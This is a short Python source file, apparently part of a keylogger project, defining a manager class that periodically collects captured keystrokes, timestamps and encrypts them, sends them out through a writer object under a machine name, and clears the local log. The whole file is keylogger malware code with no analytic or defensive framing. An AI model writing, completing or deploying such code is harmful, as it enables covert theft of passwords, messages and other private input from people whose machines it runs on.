from datetime import datetime
import time

class KeyLoggerManager:
    def __init__(self, keylogger, writer, encryptor, interval=5, machine_name="Machine1"):
        self.keylogger = keylogger
        self.writer = writer
        self.encryptor = encryptor
        self.interval = interval
        self.machine_name = machine_name
        self.buffer = []
        self.running = False
        self.thread = None

    def collect_and_store(self):
        while self.running:
            keys = self.keylogger.get_logged_keys()
            if keys:
                keys = [key for key in keys if key is not None]
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                data = f"{timestamp} - {''.join(keys)}"
                encrypted_data = self.encryptor.encrypt(data)
                self.writer.send_data(encrypted_data, self.machine_name)
                self.keylogger.logged_keys.clear()
            time.sleep(self.interval)